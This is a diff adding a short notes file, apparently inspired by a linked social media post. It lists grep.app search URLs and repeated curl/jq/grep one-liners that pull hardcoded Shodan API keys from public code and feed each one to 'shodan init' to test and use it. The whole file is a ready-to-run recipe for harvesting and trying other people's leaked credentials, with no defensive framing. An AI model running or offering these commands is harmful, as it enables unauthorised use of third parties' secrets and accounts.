@@ -1,0 +1,15 @@
+https://x.com/Dheerajmadhukar/status/1783091191032185030/photo/1
+----------
+https://grep.app/api/search?q=shodan_api_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true
+https://grep.app/api/search?q=shodan_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true
+https://grep.app/api/search?q=shodan_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true
+https://grep.app/api/search?q=shodan&words=true
+------------------
+curl -ks "https://grep.app/api/search?q=shodan_api_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true"| jq '.hits.hits[] | .content.snippet' | grep -Eo "[0-9a-zA-Z]{32}" | sort -u | while read -r api;do echo -n "${api} API:";shodan init ${api};done
+
+curl -ks "https://grep.app/api/search?q=shodan_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true"| jq '.hits.hits[] | .content.snippet' | grep -Eo "[0-9a-zA-Z]{32}" | sort -u | while read -r api;do echo -n "${api} API:";shodan init ${api};done
+
+
+curl -ks "https://grep.app/api/search?q=shodan_key%20%3D%20%22%5B0-9a-zA-Z%5D%7B32%7D%22&regexp=true" | jq '.hits.hits[] | .content.snippet' | grep -Eo "[0-9a-zA-Z]{32}" | sort -u | while read -r api;do echo -n "${api} API:";shodan init ${api};done
+
+curl -ks "https://grep.app/api/search?q=shodan&words=true" | jq '.hits.hits[] | .content.snippet' | grep -Eo "[0-9a-zA-Z]{32}" | sort -u | while read -r api;do echo -n "${api} API:";shodan init ${api};done
